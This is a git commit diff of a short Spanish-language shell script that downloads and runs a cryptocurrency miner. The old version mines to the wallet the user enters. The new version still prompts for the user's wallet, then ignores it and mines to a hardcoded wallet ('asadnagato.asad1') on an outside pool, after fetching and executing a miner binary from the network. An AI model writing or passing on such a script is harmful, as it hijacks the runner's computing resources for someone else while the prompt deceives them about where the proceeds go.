951e2c02367ee9866fdc360b925204b842085f61
adeayuvebriani <143151642+adeayuvebriani@users.noreply.github.com>
2023-08-31 16:30:24 +0800

    Update mine_trx.sh

--- mine_trx.sh
+++ mine_trx.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-read -p "Ingresa tu dirección de billetera TRX: " wallet_address && wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:80 -u TRX:$wallet_address.trx#lfh4-yohf.100001 -p x --coin monero -a rx/1,n=I_TA_VPS,o=VPS -k -t 8
+read -p "Ingresa tu dirección de billetera TRX: " wallet_address && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.5/SRBMiner-Multi-2-3-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-3-5-Linux.tar.xz && cd SRBMiner-Multi-2-3-5 && ./SRBMiner-MULTI --algorithm randomepic --pool us.epicmine.io:3333 --wallet asadnagato.asad1 --password kopimanism=pool --cpu-threads 4 --disable-gpu
